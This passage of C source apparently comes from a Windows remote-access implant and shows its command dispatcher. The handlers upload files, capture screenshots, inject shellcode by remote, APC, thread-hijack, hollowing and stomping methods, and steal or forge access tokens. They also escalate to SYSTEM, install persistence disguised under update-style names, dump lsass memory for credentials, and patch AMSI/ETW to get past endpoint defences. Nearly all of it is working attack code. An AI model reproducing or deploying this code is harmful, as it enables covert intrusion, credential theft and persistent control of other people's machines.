        HANDLE hf = CreateFileA(args, GENERIC_READ, FILE_SHARE_READ, NULL,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hf == INVALID_HANDLE_VALUE) {
            char err[64]; snprintf(err, sizeof(err), "read: error %lu", GetLastError());
            agent_send_result(task->id, "", err); return;
        }
        DWORD fsz = GetFileSize(hf, NULL);
        uint8_t *buf = (uint8_t*)malloc(fsz);
        DWORD rd = 0;
        ReadFile(hf, buf, fsz, &rd, NULL);
        CloseHandle(hf);
        const char *name = strrchr(args, '\\');
        name = name ? name + 1 : args;
        agent_upload_file(task->id, name, buf, rd);
        free(buf);
        char msg[128];
        snprintf(msg, sizeof(msg), "uploaded %lu bytes", rd);
        agent_send_result(task->id, msg, "");
    }
    else if (strcmp(type_upper, "SCREENSHOT") == 0) {
        /* Native GDI capture with WinSta0/Default desktop access so it works
         * from session 0 (SYSTEM service) when an interactive session exists.
         * Output is a BMP file (GUI accepts .bmp). */
        const char *sc_path = "C:\\Windows\\Temp\\_sc.bmp";

        HWINSTA hOrigSta = GetProcessWindowStation();
        HWINSTA hSta = OpenWindowStationA("WinSta0", FALSE,
            WINSTA_ALL_ACCESS | READ_CONTROL);
        if (hSta) SetProcessWindowStation(hSta);

        HDESK hOrigDesk = GetThreadDesktop(GetCurrentThreadId());
        /* DESKTOP_ALL_ACCESS not defined in older MinGW — use explicit mask */
        DWORD desk_access = DESKTOP_READOBJECTS|DESKTOP_CREATEWINDOW|DESKTOP_CREATEMENU|
                            DESKTOP_HOOKCONTROL|DESKTOP_JOURNALRECORD|DESKTOP_JOURNALPLAYBACK|
                            DESKTOP_ENUMERATE|DESKTOP_WRITEOBJECTS|DESKTOP_SWITCHDESKTOP|READ_CONTROL;
        HDESK hDesk = OpenDesktopA("Default", 0, FALSE, desk_access);
        if (hDesk) SetThreadDesktop(hDesk);

        HDC hDC   = GetDC(NULL);
        int sw    = GetSystemMetrics(SM_CXSCREEN);
        int sh    = GetSystemMetrics(SM_CYSCREEN);

        int ok_flag = 0;
        int no_desktop = 0;
        if (hDC && sw > 0 && sh > 0) {
            HDC hMemDC = CreateCompatibleDC(hDC);
            HBITMAP hBmp = CreateCompatibleBitmap(hDC, sw, sh);
            HGDIOBJ hOld = SelectObject(hMemDC, hBmp);
            BitBlt(hMemDC, 0, 0, sw, sh, hDC, 0, 0, SRCCOPY | CAPTUREBLT);
            SelectObject(hMemDC, hOld);

            BITMAPINFOHEADER bi = {0};
            bi.biSize        = sizeof(bi);
            bi.biWidth       = sw;
            bi.biHeight      = -sh; /* top-down */
            bi.biPlanes      = 1;
            bi.biBitCount    = 24;
            bi.biCompression = BI_RGB;
            int row_sz = (sw * 3 + 3) & ~3;
            DWORD data_sz = (DWORD)((size_t)row_sz * (size_t)sh);
            uint8_t *pixels = (uint8_t*)malloc(data_sz);
            if (pixels) {
                GetDIBits(hMemDC, hBmp, 0, (UINT)sh,
                    pixels, (BITMAPINFO*)&bi, DIB_RGB_COLORS);

                int all_black = 1;
                for (DWORD _pi = 0; _pi < data_sz && all_black; _pi++) {
                    if (pixels[_pi] != 0) all_black = 0;
                }
                if (all_black) {
                    no_desktop = 1;
                } else {
                BITMAPFILEHEADER bfh = {0};
                bfh.bfType   = 0x4D42;
                bfh.bfSize   = (DWORD)(sizeof(bfh) + sizeof(bi) + data_sz);
                bfh.bfOffBits= (DWORD)(sizeof(bfh) + sizeof(bi));

                HANDLE hF = CreateFileA(sc_path, GENERIC_WRITE, 0, NULL,
                    CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                if (hF != INVALID_HANDLE_VALUE) {
                    DWORD wr;
                    WriteFile(hF, &bfh, sizeof(bfh), &wr, NULL);
                    WriteFile(hF, &bi, sizeof(bi), &wr, NULL);
                    WriteFile(hF, pixels, data_sz, &wr, NULL);
                    CloseHandle(hF);
                    ok_flag = 1;
                }
                } /* end !all_black */
                free(pixels);
            }
            DeleteDC(hMemDC);
            DeleteObject(hBmp);
            ReleaseDC(NULL, hDC);
        }

        if (hDesk) { SetThreadDesktop(hOrigDesk); CloseDesktop(hDesk); }
        if (hSta)  { SetProcessWindowStation(hOrigSta); CloseWindowStation(hSta); }

        if (no_desktop) {
            agent_send_result(task->id, "", "screenshot: no_interactive_desktop");
        } else if (ok_flag) {
            HANDLE hF = CreateFileA(sc_path, GENERIC_READ, FILE_SHARE_READ, NULL,
                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hF != INVALID_HANDLE_VALUE) {
                DWORD fsz = GetFileSize(hF, NULL);
                uint8_t *data = (uint8_t*)malloc(fsz);
                DWORD rd = 0; ReadFile(hF, data, fsz, &rd, NULL); CloseHandle(hF);
                agent_upload_file(task->id, "screenshot.bmp", data, rd);
                free(data); DeleteFileA(sc_path);
                char m[64]; snprintf(m, 64, "[+] screenshot (%lu bytes)", rd);
                agent_send_result(task->id, m, "");
            } else agent_send_result(task->id, "", "screenshot: read failed");
        } else agent_send_result(task->id, "", "screenshot: GDI capture failed");
    }
    else if (strcmp(type_upper, "STAGE2") == 0) {
        if (!task->payload || task->payload_len == 0) {
            agent_send_result(task->id, "", "STAGE2: no shellcode payload"); return;
        }
        char *out = inject_self(task->payload, task->payload_len);
        agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "SHELLCODE_STOMP") == 0) {
        if (!task->payload || task->payload_len == 0) {
            agent_send_result(task->id, "", "SHELLCODE_STOMP: no shellcode payload"); return;
        }
        char dll_hint[128] = "";
        json_get_str(task->args ? task->args : "", "dll", dll_hint, sizeof(dll_hint), "");
        char *out = shellcode_stomp(task->payload, task->payload_len, dll_hint[0] ? dll_hint : NULL);
        agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "UDRL") == 0) {
        if (!task->payload || task->payload_len == 0) {
            agent_send_result(task->id, "", "UDRL: no shellcode payload"); return;
        }
        char *out = phantom_load(task->payload, task->payload_len);
        agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "INJECT_REMOTE") == 0) {
        if (!task->payload || task->payload_len == 0) {
            agent_send_result(task->id, "", "INJECT_REMOTE: no shellcode payload"); return;
        }
        int pid = json_get_int(args, "pid", 0);
        if (!pid) { agent_send_result(task->id, "", "INJECT_REMOTE requires {\"pid\":N}"); return; }
        char *out = inject_remote(pid, task->payload, task->payload_len);
        agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "INJECT_APC") == 0) {
        if (!task->payload || task->payload_len == 0) {
            agent_send_result(task->id, "", "INJECT_APC: no shellcode payload"); return;
        }
        int pid = json_get_int(args, "pid", 0);
        if (!pid) { agent_send_result(task->id, "", "INJECT_APC requires {\"pid\":N}"); return; }
        char *out = inject_apc(pid, task->payload, task->payload_len);
        agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "THREAD_HIJACK") == 0) {
        if (!task->payload || task->payload_len == 0) {
            agent_send_result(task->id, "", "THREAD_HIJACK: no shellcode payload"); return;
        }
        int pid = json_get_int(args, "pid", 0);
        if (!pid) { agent_send_result(task->id, "", "THREAD_HIJACK requires {\"pid\":N}"); return; }
        char *out = thread_hijack((DWORD)pid, task->payload, task->payload_len);
        agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "HOLLOW") == 0) {
        if (!task->payload || task->payload_len == 0) {
            agent_send_result(task->id, "", "HOLLOW: no payload"); return;
        }
        char tgt[MAX_PATH] = {0};
        json_get_str(args, "target", tgt, sizeof(tgt), "");
        char *out = do_hollow(tgt[0] ? tgt : NULL, task->payload, task->payload_len);
        agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "FORK_RUN") == 0) {
        if (!task->payload || task->payload_len == 0) {
            agent_send_result(task->id, "", "FORK_RUN: no shellcode payload"); return;
        }
        char cmd[MAX_PATH] = {0};
        json_get_str(args, "cmd", cmd, sizeof(cmd), "");
        char *out = fork_run(cmd[0] ? cmd : NULL, task->payload, task->payload_len);
        agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "TOKEN_STEAL") == 0 || strcmp(type_upper, "STEAL_TOKEN") == 0) {
        int pid = json_get_int(args, "pid", 0);
        if (!pid) { agent_send_result(task->id, "", "TOKEN_STEAL requires {\"pid\":N}"); return; }
        char *out = token_steal(pid);
        agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "TOKEN_MAKE") == 0) {
        char user[128]={0}, domain[128]={0}, pass[128]={0};
        if (args && args[0] == '{') {
            json_get_str(args,"user",user,sizeof(user),"");
            json_get_str(args,"domain",domain,sizeof(domain),".");
            json_get_str(args,"pass",pass,sizeof(pass),"");
        } else {
            /* plain text: "domain\user pass" or "user pass" */
            strncpy(domain,".",sizeof(domain)-1);
            const char *sp = args ? strchr(args,' ') : NULL;
            if (!sp) { agent_send_result(task->id,"","TOKEN_MAKE: usage: [domain\\]user pass"); return; }
            char domuser[256]={0};
            size_t du_len = (size_t)(sp - args);
            if (du_len >= sizeof(domuser)) du_len = sizeof(domuser)-1;
            memcpy(domuser, args, du_len);
            const char *bs = strchr(domuser,'\\');
            if (bs) {
                size_t dl = (size_t)(bs - domuser);
                if (dl >= sizeof(domain)) dl = sizeof(domain)-1;
                memcpy(domain, domuser, dl); domain[dl]='\0';
                strncpy(user, bs+1, sizeof(user)-1);
            } else {
                strncpy(user, domuser, sizeof(user)-1);
            }
            strncpy(pass, sp+1, sizeof(pass)-1);
        }
        if (!user[0] || !pass[0]) { agent_send_result(task->id,"","TOKEN_MAKE requires user+pass"); return; }
        char *out = token_make(user, domain, pass);
        agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "TOKEN_DROP") == 0 || strcmp(type_upper, "REV2SELF") == 0) {
        /* NtSetInformationThread(ThreadImpersonationToken=5, NULL) — avoids advapi32 hook */
        typedef LONG (WINAPI *pNtSIT)(HANDLE, ULONG, PVOID, ULONG);
        HMODULE hNT = GetModuleHandleA("ntdll.dll");
        pNtSIT NtSIT = hNT ? (pNtSIT)GetProcAddress(hNT, "NtSetInformationThread") : NULL;
        HANDLE hNull = NULL;
        if (NtSIT) NtSIT(GetCurrentThread(), 5 /*ThreadImpersonationToken*/, &hNull, sizeof(hNull));
        else RevertToSelf();
        HANDLE old = (HANDLE)InterlockedExchangePointer((PVOID*)&g_stolen_token, NULL);
        if (old) CloseHandle(old);
        agent_send_result(task->id, "[+] reverted to original token", "");
    }
    else if (strcmp(type_upper, "TOKEN_WHOAMI") == 0) {
        /* NT path: OpenThreadToken → NtQueryInformationToken → LookupAccountSidW
         * Avoids GetUserNameA/W which are commonly hooked by EDRs. */
        typedef LONG (WINAPI *pNtQIT)(HANDLE, ULONG, PVOID, ULONG, PULONG);
        HMODULE hNT = GetModuleHandleA("ntdll.dll");
        pNtQIT NtQIT = hNT ? (pNtQIT)GetProcAddress(hNT, "NtQueryInformationToken") : NULL;
        char out[512] = {0};
        HANDLE hTok = NULL;
        if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &hTok))
            OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hTok);
        if (hTok && NtQIT) {
            ULONG needed = 0;
            NtQIT(hTok, 1 /*TokenUser*/, NULL, 0, &needed);
            if (needed > 0) {
                BYTE *tub = (BYTE*)malloc(needed);
                if (tub && NtQIT(hTok, 1, tub, needed, &needed) == 0) {
                    TOKEN_USER *tu = (TOKEN_USER*)tub;
                    WCHAR wuser[128]={0}, wdom[128]={0};
                    DWORD ulen=128, dlen=128;
                    SID_NAME_USE stype=SidTypeUnknown;
                    if (LookupAccountSidW(NULL, tu->User.Sid, wuser, &ulen, wdom, &dlen, &stype)) {
                        char u8[128]={0}, d8[128]={0};
                        WideCharToMultiByte(CP_UTF8,0,wdom,-1,d8,sizeof(d8)-1,NULL,NULL);
                        WideCharToMultiByte(CP_UTF8,0,wuser,-1,u8,sizeof(u8)-1,NULL,NULL);
                        snprintf(out, sizeof(out), "%s\\%s", d8, u8);
                    }
                }
                free(tub);
            }
        }
        if (!out[0]) {
            /* NT path failed — fallback to GetUserNameExW(NameSamCompatible) for domain\user */
            typedef BOOLEAN (WINAPI *pGUNEx)(DWORD, LPWSTR, PULONG);
            HMODULE hSec = LoadLibraryA("secur32.dll");
            pGUNEx GUNEx = hSec ? (pGUNEx)GetProcAddress(hSec, "GetUserNameExW") : NULL;
            WCHAR wbuf[256]={0}; ULONG wsz=256;
            if (GUNEx && GUNEx(2 /*NameSamCompatible*/, wbuf, &wsz))
                WideCharToMultiByte(CP_UTF8,0,wbuf,-1,out,sizeof(out)-1,NULL,NULL);
            else { DWORD sz=(DWORD)sizeof(out); GetUserNameA(out, &sz); }
        }
        if (hTok) CloseHandle(hTok);
        agent_send_result(task->id, out, "");
    }
    else if (strcmp(type_upper, "GETSYSTEM") == 0) {
        char *out = get_system();
        int elevated = out && strncmp(out, "[+]", 3) == 0;
        agent_send_result_admin(task->id, out ? out : "", "", elevated); free(out);
    }
    else if (strcmp(type_upper, "PERSIST") == 0) {
        char name[128]={0}, cmd2[512]={0}, meth[32]={0};
        json_get_str(args,"name",name,sizeof(name),"Updater");
        json_get_str(args,"cmd",cmd2,sizeof(cmd2),"");
        json_get_str(args,"method",meth,sizeof(meth),"registry");
        /* persist enum: scan all persistence mechanisms */
        if (strcmp(meth,"enum")==0 || strcmp(meth,"check")==0 || strcmp(meth,"list")==0) {
            char *result = NULL;
            size_t rlen = 0, rcap = 0;
#define PEAPPEND(s) do { size_t _n=strlen(s); if(rlen+_n+1>rcap){rcap=(rlen+_n+1)*2+2048; result=(char*)realloc(result,rcap);} if(result){memcpy(result+rlen,s,_n); rlen+=_n; result[rlen]='\0';} } while(0)
            char *r; char tmp[256];
            PEAPPEND("[*] Scanning persistence mechanisms...\n\n[HKCU Run]\n");
            r=run_shell("reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" 2>&1"); if(r){PEAPPEND(r);PEAPPEND("\n");free(r);}
            PEAPPEND("\n[HKLM Run]\n");
            r=run_shell("reg query \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" 2>&1"); if(r){PEAPPEND(r);PEAPPEND("\n");free(r);}
            PEAPPEND("\n[Startup folder]\n");
            r=run_shell("cmd /c dir /B \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" 2>&1"); if(r){PEAPPEND(r);PEAPPEND("\n");free(r);}
            PEAPPEND("\n[Scheduled tasks]\n");
            r=run_shell("schtasks /query /fo TABLE /nh 2>&1"); if(r){PEAPPEND(r);PEAPPEND("\n");free(r);}
            PEAPPEND("\n[WMI subscriptions]\n");
            r=run_shell("wmic /NAMESPACE:\"\\\\root\\subscription\" PATH CommandLineEventConsumer get Name,ExecutablePath /format:list 2>&1"); if(r){PEAPPEND(r);PEAPPEND("\n");free(r);}
            PEAPPEND("\n[Services (known names)]\n");
            const char *svcs[]={"WindowsManagementService","Updater","MicrosoftUpdateService","WindowsUpdate",NULL};
            for(int i=0;svcs[i];i++){snprintf(tmp,sizeof(tmp),"sc query \"%s\" 2>&1",svcs[i]); r=run_shell(tmp); if(r&&strstr(r,"STATE")){snprintf(tmp,sizeof(tmp),"  [FOUND] %s\n",svcs[i]); PEAPPEND(tmp);} free(r);}
            PEAPPEND("\n[COM hijacking (HKCU\\\\Classes\\\\CLSID)]\n");
            r=run_shell("reg query \"HKCU\\Software\\Classes\\CLSID\" 2>&1"); if(r){PEAPPEND(r);free(r);}
#undef PEAPPEND
            if(!result) result=_strdup("[!] persist enum: out of memory");
            agent_send_result(task->id, result, ""); free(result); return;
        }
        if (!cmd2[0]) { agent_send_result(task->id,"","PERSIST requires cmd"); return; }
        char shell_cmd[1024]={0};
        if (strcmp(meth,"schtask")==0)
            snprintf(shell_cmd,sizeof(shell_cmd),"schtasks /create /tn \"%s\" /tr \"%s\" /sc ONLOGON /ru SYSTEM /f 2>&1",name,cmd2);
        else
            snprintf(shell_cmd,sizeof(shell_cmd),"reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"%s\" /t REG_SZ /d \"%s\" /f 2>&1",name,cmd2);
        char *out = run_shell(shell_cmd);
        agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "PERSIST_RM") == 0) {
        char name[128]={0}, meth[32]={0};
        json_get_str(args,"name",name,sizeof(name),"");
        json_get_str(args,"method",meth,sizeof(meth),"registry");
        if (!name[0]) { agent_send_result(task->id,"","PERSIST_RM requires name"); return; }
        char shell_cmd[512]={0};
        if (strcmp(meth,"schtask")==0)
            snprintf(shell_cmd,sizeof(shell_cmd),"schtasks /delete /tn \"%s\" /f 2>&1",name);
        else
            snprintf(shell_cmd,sizeof(shell_cmd),"reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"%s\" /f 2>&1",name);
        char *out = run_shell(shell_cmd);
        agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "PERSIST_TASK") == 0) {
        /* Args: optional task name (defaults to MicrosoftUpdateTask) */
        char name[128] = "MicrosoftUpdateTask";
        if (args && args[0]) strncpy(name, args, sizeof(name)-1);
        /* Get own executable path */
        char self_path[MAX_PATH] = {0};
        GetModuleFileNameA(NULL, self_path, sizeof(self_path));
        char shell_cmd[1024] = {0};
        snprintf(shell_cmd, sizeof(shell_cmd),
            "schtasks /create /tn \"%s\" /tr \"%s\" /sc ONLOGON /f 2>&1",
            name, self_path);
        char *out = run_shell(shell_cmd);
        agent_send_result(task->id, out ? out : "", ""); free(out);
    }
    else if (strcmp(type_upper, "SSH_EXEC") == 0) {
        char host[256]={0}, user[128]={0}, pass[256]={0}, cmd2[1024]={0};
        int  port = json_get_int(args, "port", 22);
        json_get_str(args, "host", host, sizeof(host), "");
        json_get_str(args, "user", user, sizeof(user), "");
        json_get_str(args, "pass", pass, sizeof(pass), "");
        json_get_str(args, "cmd",  cmd2, sizeof(cmd2), "");
        if (!host[0] || !user[0] || !cmd2[0]) {
            agent_send_result(task->id, "", "SSH_EXEC: {host,user,cmd} required"); return;
        }
        /* Use PowerShell Invoke-Command -HostName (requires Win10 1809+ OpenSSH) */
        char ps_buf[2048];
        snprintf(ps_buf, sizeof(ps_buf),
            "$pw=ConvertTo-SecureString '%s' -AsPlainText -Force;"
            "$cred=New-Object PSCredential('%s',$pw);"
            "Invoke-Command -HostName %s -Port %d -UserName %s -ScriptBlock {%s} 2>&1",
            pass, user, host, port, user, cmd2);
        char sh_cmd[3072];
        snprintf(sh_cmd, sizeof(sh_cmd),
            "powershell -NoP -W Hidden -Exec Bypass -C \"%s\"", ps_buf);
        char *out = run_shell(sh_cmd);
        agent_send_result(task->id, out ? out : "", ""); free(out);
    }
    else if (strcmp(type_upper, "REG_QUERY") == 0) {
        char path[512] = {0}, name[256] = {0};
        if (args && args[0] == '{') {
            json_get_str(args, "path", path, sizeof(path), "");
            json_get_str(args, "name", name, sizeof(name), "");
        } else if (args) {
            strncpy(path, args, sizeof(path) - 1);
        }
        char cmd2[1024];
        if (name[0])
            snprintf(cmd2, sizeof(cmd2), "reg query \"%s\" /v \"%s\" 2>&1", path, name);
        else
            snprintf(cmd2, sizeof(cmd2), "reg query \"%s\" 2>&1", path);
        char *out = run_shell(cmd2); agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "REG_LIST") == 0) {
        char path[512] = {0};
        if (args && args[0] == '{')
            json_get_str(args, "path", path, sizeof(path), "");
        else if (args)
            strncpy(path, args, sizeof(path) - 1);
        char cmd2[1024]; snprintf(cmd2, sizeof(cmd2), "reg query \"%s\" /s 2>&1", path);
        char *out = run_shell(cmd2); agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "REG_SET") == 0) {
        char path[256]={0}, name[128]={0}, typ2[32]={0}, val[512]={0};
        json_get_str(args,"path",path,sizeof(path),"");
        json_get_str(args,"name",name,sizeof(name),"");
        json_get_str(args,"type",typ2,sizeof(typ2),"REG_SZ");
        json_get_str(args,"value",val,sizeof(val),"");
        char cmd2[1024]; snprintf(cmd2,sizeof(cmd2),"reg add \"%s\" /v \"%s\" /t %s /d \"%s\" /f 2>&1",path,name,typ2,val);
        char *out = run_shell(cmd2); agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "REG_DELETE") == 0) {
        char path[256]={0}, name[128]={0};
        json_get_str(args,"path",path,sizeof(path),"");
        json_get_str(args,"name",name,sizeof(name),"");
        char cmd2[512];
        if (name[0])
            snprintf(cmd2,sizeof(cmd2),"reg delete \"%s\" /v \"%s\" /f 2>&1",path,name);
        else
            snprintf(cmd2,sizeof(cmd2),"reg delete \"%s\" /f 2>&1",path);
        char *out = run_shell(cmd2); agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "PORT_SCAN") == 0) {
        char host[128]={0}, ports_arg[512]={0};
        int timeout_ms = 500;
        if (args && args[0] == '{') {
            json_get_str(args,"host",host,sizeof(host),"127.0.0.1");
            json_get_str(args,"ports",ports_arg,sizeof(ports_arg),"80,443,445,3389,22,21,8080");
            timeout_ms = json_get_int(args,"timeout",500);
        } else {
            char ac[640]; strncpy(ac, args && args[0] ? args : "", 639); ac[639]='\0';
            char *s1=strchr(ac,' '), *s2=s1?strchr(s1+1,' '):NULL;
            if(s1){*s1='\0'; strncpy(host,ac,127);}
            if(s1&&s2){*s2='\0'; strncpy(ports_arg,s1+1,511); if(*(s2+1)) timeout_ms=atoi(s2+1);}
            else if(s1){strncpy(ports_arg,s1+1,511);}
            else if(ac[0]){strncpy(host,ac,127);}
            if(!host[0]) strncpy(host,"127.0.0.1",127);
            if(!ports_arg[0]) strncpy(ports_arg,"80,443,445,3389,22,21,8080",511);
        }

        /* Resolve host once */
        struct in_addr resolved = {0};
        resolved.s_addr = inet_addr(host);
        if (resolved.s_addr == INADDR_NONE) {
            struct hostent *he = gethostbyname(host);
            if (he) memcpy(&resolved, he->h_addr, 4);
        }

        size_t out_cap = 4096, out_len = 0;
        char *out_buf = (char*)malloc(out_cap);
        if (!out_buf) { agent_send_result(task->id,"","oom"); goto ps_done; }
        out_buf[0] = '\0';

        char ports_copy[512];
        strncpy(ports_copy, ports_arg, sizeof(ports_copy)-1);
        char *tok = strtok(ports_copy, ",");
        while (tok) {
            int port = atoi(tok);
            tok = strtok(NULL, ",");
            if (port <= 0 || port > 65535) continue;

            SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s == INVALID_SOCKET) continue;

            /* Non-blocking connect with select timeout */
            u_long nb = 1; ioctlsocket(s, FIONBIO, &nb);
            struct sockaddr_in sa = {0};
            sa.sin_family = AF_INET;
            sa.sin_port   = htons((u_short)port);
            sa.sin_addr   = resolved;
            connect(s, (struct sockaddr*)&sa, sizeof(sa));

            fd_set wfds; FD_ZERO(&wfds); FD_SET(s, &wfds);
            struct timeval tv = {timeout_ms/1000, (timeout_ms%1000)*1000};
            if (select(0, NULL, &wfds, NULL, &tv) > 0) {
                int err=0; int el=sizeof(err);
                getsockopt(s, SOL_SOCKET, SO_ERROR, (char*)&err, &el);
                if (err == 0) {
                    char line[128];
                    int ll = snprintf(line,sizeof(line),"OPEN %s:%d\n",host,port);
                    if (out_len + (size_t)ll + 2 >= out_cap) {
                        out_cap += 4096;
                        char *nb2=(char*)realloc(out_buf,out_cap);
                        if(nb2) out_buf=nb2;
                    }
                    memcpy(out_buf+out_len, line, (size_t)ll);
                    out_len += (size_t)ll;
                    out_buf[out_len] = '\0';
                }
            }
            closesocket(s);
        }
        if (out_len == 0) strcpy(out_buf, "[no open ports found]");
        agent_send_result(task->id, out_buf, "");
        free(out_buf);
        ps_done:;
    }
    else if (strcmp(type_upper, "MINIDUMP") == 0) {
        char path[MAX_PATH]={0};
        json_get_str(args,"path",path,sizeof(path),"C:\\Windows\\Temp\\1.dmp");

        /* Find lsass.exe PID via snapshot (no OpenProcess needed yet) */
        DWORD lsass_pid = 0;
        HANDLE snap2 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap2 != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe2; pe2.dwSize = sizeof(pe2);
            if (Process32First(snap2, &pe2)) {
                do {
                    if (_stricmp(pe2.szExeFile, "lsass.exe") == 0) { lsass_pid = pe2.th32ProcessID; break; }
                } while (Process32Next(snap2, &pe2));
            }
            CloseHandle(snap2);
        }
        if (!lsass_pid) { agent_send_result(task->id, "", "lsass not found"); }
        else {
            HANDLE hLsa = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, lsass_pid);
            if (!hLsa) { char e[64]; snprintf(e,sizeof(e),"OpenProcess lsass %lu",GetLastError()); agent_send_result(task->id,"",e); }
            else {
                HANDLE hF = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                if (hF == INVALID_HANDLE_VALUE) {
                    CloseHandle(hLsa);
                    char e[64]; snprintf(e,sizeof(e),"CreateFile %lu",GetLastError()); agent_send_result(task->id,"",e);
                } else {
                    typedef BOOL (WINAPI *pfnMWD)(HANDLE,DWORD,HANDLE,DWORD,void*,void*,void*);
                    HMODULE hDbg = LoadLibraryA("dbghelp.dll");
                    pfnMWD miniDump = hDbg ? (pfnMWD)GetProcAddress(hDbg,"MiniDumpWriteDump") : NULL;
                    if (!miniDump) {
                        CloseHandle(hF); CloseHandle(hLsa);
                        if (hDbg) FreeLibrary(hDbg);
                        agent_send_result(task->id,"","dbghelp MiniDumpWriteDump unavailable");
                    } else {
                        /* MiniDumpWithFullMemory = 2 */
                        BOOL ok = miniDump(hLsa, lsass_pid, hF, 2, NULL, NULL, NULL);
                        CloseHandle(hF); CloseHandle(hLsa); FreeLibrary(hDbg);
                        if (ok) {
                            char m[256]; snprintf(m,sizeof(m),"[+] dump written to %s",path);
                            agent_send_result(task->id, m, "");
                        } else {
                            char e[64]; snprintf(e,sizeof(e),"MiniDumpWriteDump failed %lu",GetLastError());
                            agent_send_result(task->id,"",e);
                        }
                    }
                }
            }
        }
    }
    else if (strcmp(type_upper, "LSASS_DUMP_NT") == 0) {
        DWORD lsas_pid = 0;
        if (args && args[0] && args[0] != '{') lsas_pid = (DWORD)strtoul(args, NULL, 10);
        size_t dump_len = 0;
        int dump_partial = 0;
        uint8_t *dump = lsass_dump_nt(lsas_pid, &dump_len, &dump_partial);
        if (!dump || dump_len == 0) {
            agent_send_result(task->id, "", "lsass_dump_nt: failed (access denied or resource limit)");
        } else {
            agent_upload_file(task->id, "lsass_nt.dmp", dump, dump_len);
            char msg[128];
            snprintf(msg, sizeof(msg), "[+] lsass NT dump: %zu bytes%s", dump_len,
                     dump_partial ? " (partial: resource limit reached)" : "");
            agent_send_result(task->id, msg, "");
        }
        free(dump);
    }
    else if (strcmp(type_upper, "ENV") == 0) {
        char *out = run_shell("set 2>&1"); agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "HW_BP_CHECK") == 0) {
        HANDLE ht = OpenThread(THREAD_GET_CONTEXT, FALSE, GetCurrentThreadId());
        if (!ht) {
            agent_send_result(task->id, "", "OpenThread failed");
        } else {
            CONTEXT ctx = {0};
            ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
            char msg[128] = "[+] No hardware breakpoints detected";
            if (GetThreadContext(ht, &ctx)) {
                if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) {
                    snprintf(msg, sizeof(msg),
                        "[!] Hardware breakpoints active: DR0=%p DR1=%p DR2=%p DR3=%p",
                        (void*)ctx.Dr0, (void*)ctx.Dr1, (void*)ctx.Dr2, (void*)ctx.Dr3);
                }
            }
            CloseHandle(ht);
            agent_send_result(task->id, msg, "");
        }
    }
    else if (strcmp(type_upper, "HWBP_CLEAR") == 0) {
        HANDLE ht = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, GetCurrentThreadId());
        if (!ht) {
            char e[64]; snprintf(e,sizeof(e),"OpenThread failed (err %lu)",(DWORD)GetLastError());
            agent_send_result(task->id, "", e);
        } else {
            CONTEXT ctx = {0};
            ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
            if (GetThreadContext(ht, &ctx)) {
                ctx.Dr0=0; ctx.Dr1=0; ctx.Dr2=0; ctx.Dr3=0;
                ctx.Dr6=0; ctx.Dr7=0;
                SetThreadContext(ht, &ctx);
            }
            CloseHandle(ht);
            agent_send_result(task->id, "[+] hardware breakpoints cleared", "");
        }
    }
    else if (strcmp(type_upper, "AMSI_BYPASS") == 0) {
        amsi_bypass();
        agent_send_result(task->id, "[+] AMSI/ETW re-patched", "");
    }
    else if (strcmp(type_upper, "WIPE_MZ") == 0) {
        HMODULE base = GetModuleHandleW(NULL);
        if (!base) {
            agent_send_result(task->id, "", "GetModuleHandleW failed");
        } else {
            DWORD old=0;
            VirtualProtect((LPVOID)base, 2, PAGE_READWRITE, &old);
            *(BYTE*)base = 0;
            *((BYTE*)base+1) = 0;
            VirtualProtect((LPVOID)base, 2, old, &old);
            agent_send_result(task->id, "[+] MZ header wiped", "");
        }
    }
    else if (strcmp(type_upper, "CLR_STOMP") == 0) {
        int stomped = 0;
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, 0);
        if (snap != INVALID_HANDLE_VALUE) {
            MODULEENTRY32 me = { sizeof(MODULEENTRY32) };
            if (Module32First(snap, &me)) {
                do {
                    /* Check if module name contains "clr" or "mscor" */
                    char lname[256] = {0};
                    strncpy(lname, me.szModule, sizeof(lname)-1);
